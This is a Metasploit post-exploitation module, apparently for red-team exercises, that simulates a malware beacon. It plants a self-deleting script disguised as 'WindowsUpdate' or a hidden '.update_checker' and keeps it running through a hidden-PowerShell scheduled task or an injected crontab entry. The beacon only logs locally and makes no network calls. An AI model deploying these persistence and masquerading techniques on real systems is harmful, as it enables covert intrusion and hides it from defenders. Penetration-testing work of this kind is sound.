##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Platform Time-Bomb Beacon (Simulated Malware)',
        'Description' => %q{
          This module simulates Command & Control (C2) beacon behavior by creating
          a script that periodically "beacons" back (simulated) with automatic
          self-destruct after a configurable time period.

          The module demonstrates realistic malware behavior patterns for penetration
          testing and red team exercises, including:
          - Periodic callback/beacon simulation
          - Process hiding techniques (basic)
          - Automatic cleanup and artifact removal

          SIMULATED MALWARE CATEGORY:
          This module is designed for penetration testing to demonstrate C2-like
          behavior without establishing actual command and control. All artifacts
          are automatically removed after the expiration period.

          Supports: Windows, Linux, macOS, Unix via Meterpreter or Shell sessions.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Metasploit Framework' ],
        'Platform' => [ 'win', 'linux', 'osx', 'unix' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptInt.new('BEACON_INTERVAL', [true, 'Interval between beacons in minutes', 5]),
        OptInt.new('EXPIRATION_HOURS', [true, 'Hours until auto-cleanup (time bomb)', 24]),
        OptString.new('BEACON_TARGET', [false, 'Simulated beacon target (for logging only)', 'localhost']),
        OptBool.new('VERBOSE', [true, 'Verbose output', true])
      ]
    )
  end

  def run
    print_status("=" * 60)
    print_status("SIMULATED MALWARE: Time-Bomb Beacon Module")
    print_status("=" * 60)
    print_warning("Beacon will AUTO-CLEANUP after #{datastore['EXPIRATION_HOURS']} hours")
    print_status("=" * 60)

    # Detect platform
    platform = detect_platform
    unless platform
      print_error("Unable to detect platform")
      return
    end

    print_status("Detected platform: #{platform}")

    # Generate the beacon script
    script_content = generate_beacon_script(platform)
    unless script_content
      print_error("Failed to generate beacon script")
      return
    end

    # Deploy the script
    script_path = deploy_script(platform, script_content)
    unless script_path
      print_error("Failed to deploy beacon script")
      return
    end

    print_good("Beacon script deployed: #{script_path}")

    # Setup beacon execution
    if setup_beacon(platform, script_path)
      print_good("Beacon activated successfully")
      print_status("Beacon interval: #{datastore['BEACON_INTERVAL']} minutes")
      print_status("Auto-cleanup scheduled for: #{Time.now + (datastore['EXPIRATION_HOURS'] * 3600)}")
      print_status("All artifacts will self-destruct after #{datastore['EXPIRATION_HOURS']} hours")
    else
      print_error("Failed to activate beacon")
      cleanup_script(platform, script_path)
    end
  end

  def detect_platform
    sysinfo = nil
    begin
      if session.type == 'meterpreter'
        sysinfo = session.sys.config.sysinfo
        os = sysinfo['OS']
      else
        os = cmd_exec('uname -s 2>/dev/null || ver 2>/dev/null || echo unknown').to_s.strip
      end

      return 'windows' if os =~ /windows/i
      return 'linux' if os =~ /linux/i
      return 'osx' if os =~ /darwin/i || os =~ /mac/i
      return 'unix' if os =~ /bsd/i || os =~ /unix/i
    rescue StandardError => e
      vprint_error("Error detecting platform: #{e.message}")
    end

    nil
  end

  def generate_beacon_script(platform)
    expiration_seconds = datastore['EXPIRATION_HOURS'] * 3600
    expiration_timestamp = Time.now.to_i + expiration_seconds
    beacon_interval = datastore['BEACON_INTERVAL'] * 60
    beacon_target = datastore['BEACON_TARGET'] || 'localhost'

    case platform
    when 'windows'
      generate_windows_beacon(expiration_timestamp, beacon_interval, beacon_target)
    when 'linux', 'osx', 'unix'
      generate_unix_beacon(expiration_timestamp, beacon_interval, beacon_target)
    end
  end

  def generate_windows_beacon(expiration_timestamp, beacon_interval, beacon_target)
    script = <<~POWERSHELL
      # Time-Bomb Beacon Script (Simulated Malware)
      # Auto-cleanup timestamp: #{Time.at(expiration_timestamp)}

      $expirationTime = #{expiration_timestamp}
      $beaconInterval = #{beacon_interval}
      $beaconTarget = "#{beacon_target}"
      $logFile = "$env:TEMP\\.beacon_log"

      function Check-Expiration {
          $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
          if ($currentTime -ge $expirationTime) {
              return $true
          }
          return $false
      }

      function Cleanup-Artifacts {
          try {
              # Remove scheduled task
              schtasks /Delete /TN "WindowsUpdate" /F 2>$null
              # Remove log file
              Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue
              # Remove this script
              Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
          } catch {}
          exit
      }

      function Send-Beacon {
          $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
          $hostname = $env:COMPUTERNAME
          $username = $env:USERNAME
          
          # Simulate beacon (logging only - no actual network traffic)
          $beaconData = "[$timestamp] Beacon from $hostname\\$username to $beaconTarget"
          
          try {
              Add-Content -Path $logFile -Value $beaconData -ErrorAction SilentlyContinue
          } catch {}
      }

      # Main beacon loop - runs once per execution
      if (Check-Expiration) {
          Cleanup-Artifacts
      } else {
          Send-Beacon
      }
    POWERSHELL

    script
  end

  def generate_unix_beacon(expiration_timestamp, beacon_interval, beacon_target)
    script = <<~BASH
      #!/bin/bash
      # Time-Bomb Beacon Script (Simulated Malware)
      # Auto-cleanup timestamp: #{Time.at(expiration_timestamp)}

      EXPIRATION_TIME=#{expiration_timestamp}
      BEACON_INTERVAL=#{beacon_interval}
      BEACON_TARGET="#{beacon_target}"
      SCRIPT_PATH="$0"
      LOG_FILE="/tmp/.beacon_log"

      check_expiration() {
          CURRENT_TIME=$(date +%s)
          if [ "$CURRENT_TIME" -ge "$EXPIRATION_TIME" ]; then
              return 0
          fi
          return 1
      }

      cleanup_artifacts() {
          # Remove cron job
          crontab -l 2>/dev/null | grep -v "$(basename $SCRIPT_PATH)" | crontab - 2>/dev/null
          
          # Remove log file
          rm -f "$LOG_FILE" 2>/dev/null
          
          # Remove this script
          rm -f "$SCRIPT_PATH" 2>/dev/null
          exit 0
      }

      send_beacon() {
          TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
          HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
          USERNAME=$(whoami 2>/dev/null || echo "unknown")
          
          # Simulate beacon (logging only - no actual network traffic)
          BEACON_DATA="[$TIMESTAMP] Beacon from $USERNAME@$HOSTNAME to $BEACON_TARGET"
          
          echo "$BEACON_DATA" >> "$LOG_FILE" 2>/dev/null
      }

      # Main beacon loop - runs once per execution
      if check_expiration; then
          cleanup_artifacts
      else
          send_beacon
      fi
    BASH

    script
  end

  def deploy_script(platform, script_content)
    case platform
    when 'windows'
      script_name = 'WindowsUpdate.ps1'
      script_dir = get_temp_dir(platform)
      script_path = "#{script_dir}\\#{script_name}"
      
      begin
        write_file(script_path, script_content)
        vprint_good("Script written to: #{script_path}")
        return script_path
      rescue StandardError => e
        print_error("Failed to write script: #{e.message}")
        return nil
      end

    when 'linux', 'osx', 'unix'
      script_name = '.update_checker'
      script_dir = get_temp_dir(platform)
      script_path = "#{script_dir}/#{script_name}"
      
      begin
        write_file(script_path, script_content)
        cmd_exec("chmod +x #{script_path}")
        vprint_good("Script written to: #{script_path}")
        return script_path
      rescue StandardError => e
        print_error("Failed to write script: #{e.message}")
        return nil
      end
    end
  end

  def get_temp_dir(platform)
    case platform
    when 'windows'
      if session.type == 'meterpreter'
        return session.sys.config.getenv('TEMP')
      else
        return cmd_exec('echo %TEMP%').strip
      end
    when 'linux', 'osx', 'unix'
      return '/tmp'
    end
  end

  def setup_beacon(platform, script_path)
    beacon_interval = datastore['BEACON_INTERVAL']

    case platform
    when 'windows'
      setup_windows_beacon(script_path, beacon_interval)
    when 'linux', 'osx', 'unix'
      setup_unix_beacon(script_path, beacon_interval)
    end
  end

  def setup_windows_beacon(script_path, interval_minutes)
    # Use Scheduled Task for periodic execution
    cmd = "schtasks /Create /TN WindowsUpdate /TR \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File #{script_path}\" /SC MINUTE /MO #{interval_minutes} /F"
    
    begin
      result = cmd_exec(cmd)
      if result.to_s.downcase.include?('success') || result.to_s.empty?
        vprint_good("Beacon scheduled (every #{interval_minutes} minutes)")
        return true
      else
        vprint_error("Failed to schedule beacon: #{result}")
        return false
      end
    rescue StandardError => e
      print_error("Failed to setup beacon: #{e.message}")
      return false
    end
  end

  def setup_unix_beacon(script_path, interval_minutes)
    # Use cron for periodic execution
    begin
      # Get current crontab
      current_cron = cmd_exec('crontab -l 2>/dev/null')
      
      # Add our beacon job - properly escape for shell
      cron_entry = "*/#{interval_minutes} * * * * #{script_path}"
      
      # Write to temporary file to avoid shell expansion issues
      temp_cron = "/tmp/.crontab_#{Rex::Text.rand_text_alpha(8)}"
      write_file(temp_cron, current_cron + "\n#{cron_entry}\n")
      cmd_exec("crontab '#{temp_cron}'")
      cmd_exec("rm -f '#{temp_cron}'")
      
      vprint_good("Beacon scheduled (every #{interval_minutes} minutes)")
      return true
    rescue StandardError => e
      print_error("Failed to setup beacon: #{e.message}")
      return false
    end
  end

  def cleanup_script(platform, script_path)
    begin
      if platform == 'windows'
        cmd_exec("del /F /Q \"#{script_path}\"")
      else
        cmd_exec("rm -f #{script_path}")
      end
      vprint_status("Cleaned up script: #{script_path}")
    rescue StandardError => e
      vprint_error("Failed to cleanup script: #{e.message}")
    end
  end
end
